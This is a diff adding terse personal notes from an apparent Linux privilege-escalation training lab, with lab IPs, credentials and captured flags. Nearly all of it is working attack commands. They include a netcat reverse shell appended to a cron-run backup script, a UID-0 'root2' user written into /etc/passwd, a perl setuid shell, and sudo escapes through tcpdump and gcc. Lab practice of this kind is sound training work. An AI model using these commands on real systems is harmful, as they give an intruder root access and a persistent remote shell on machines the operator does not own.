@@ -1,0 +1,144 @@
+Linux privilege escalation
+
+Enumerating linux
+
+attacker 192.168.49.53
+
+192.168.53.214
+joe:offsec
+
+cat /etc/os-release
+VERSION_CODENAME=buster
+
+--
+crontab -l
+
+--
+SUID
+
+----
+find / -perm -u=s -type f 2>/dev/null
+strings /usr/bin/passwd_flag
+OS{0f7ca4f3976ac64e6c44fb65fa052b03}
+
+--------------
+192.168.53.214
+joe:offsec
+
+/usr/bin/unix-privesc-check/unix-privesc-check
+
+find / -name "unix-privesc-check"
+sudo apt install unix-privesc-check
+cannot install !
+
+-------------
+Exposed confidential information
+
+sudo -l
+
+------------
+watch 
+
+----------
+Insecure file file permissions
+
+/var/log/syslog
+
+---------------
+192.168.53.214
+joe:offsec
+
+grep "CRON" /var/log/syslog
+/home/joe/.scripts/user_backups.sh
+
+cd .scripts
+echo >> user_backups.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.53 4444 >/tmp/f" >> user_backups.sh
+
+nc -lnvp 4444
+id
+
+/root
+no flag !
+
+-----------
+crypt
+
+---------
+openssl passwd w00t
+echo "root2:2s2J19dEk8bls:0:0:root:/root:/bin/bash" >> /etc/passwd
+su root2
+w00t
+id
+/root/flag.txt
+OS{eab42f1c0c9db1a4d62a20993909f4df}
+
+----------------
+Insecure system components
+
+getcap
+
+-------------
+192.168.53.214
+joe:offsec
+
+/usr/sbin/getcap -r / 2>/dev/null
+
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+id
+
+no root!
+
+-----------------------
+AppArmor
+
+--------
+sudo -l
+
+/usr/sbin/tcpdump:
+
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+
+permission denial!
+
+/usr/bin/gcc:
+
+sudo gcc -wrapper /bin/sh,-s .
+(Ref: GTFObins, https://gtfobins.github.io/gtfobins/gcc/)
+
+id
+/root/flag.txt
+OS{88eb4dc99c3c4de95021a550b30c9580}
+
+-------
+gcc
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
